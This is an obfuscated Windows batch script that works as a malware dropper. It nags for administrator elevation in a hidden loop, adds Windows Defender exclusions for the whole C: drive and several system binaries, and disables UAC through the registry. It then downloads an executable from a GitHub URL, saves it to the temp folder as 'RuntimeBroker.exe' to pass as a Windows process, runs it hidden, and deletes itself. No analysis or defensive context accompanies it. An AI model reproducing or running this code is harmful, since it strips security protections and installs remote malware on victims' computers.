@echo off & setlocal enableDelayedExpansion
set "sIfHR=NET" & set "nCBEA=SESSION" & set "iZnbu=>nul" & set "XgLRR=2>&1"
%sIfHR% %nCBEA% %iZnbu% %XgLRR%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "SIfPq=baz" & set "ylFbC=bar" & set "gMoAs=qux" & set "DUR=foo" & rem LkpNcLM QNV CkfCp
set "fqA=powershell -ExecutionPolicy Bypass -Command"
set "CfW=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "HLO='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "PRdR='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!fqA! "!CfW! !HLO! !PRdR!" %iZnbu% %XgLRR%
set "zBX=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "GSZHA=-Name 'EnableLUA' -Value 0"
!fqA! "!zBX! !GSZHA!" %iZnbu% %XgLRR%
set "pWeH=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!fqA! "!pWeH!" %iZnbu% %XgLRR%
if !errorlevel! neq 0 (goto %a%)
set "yqM=timeout /t" & !yqM! 2 %iZnbu% %XgLRR%
set "Qgz=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "zuLb=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "ziwh=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!fqA! "!Qgz! !zuLb! !ziwh!" %iZnbu% %XgLRR%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!yqM! 1 %iZnbu% %XgLRR% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %iZnbu% %XgLRR%
del /f /q "%~f0" %iZnbu% %XgLRR%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %iZnbu% %XgLRR%
if !errorlevel! neq 0 (!yqM! 3 %iZnbu% %XgLRR% & goto %b%)
exit /b
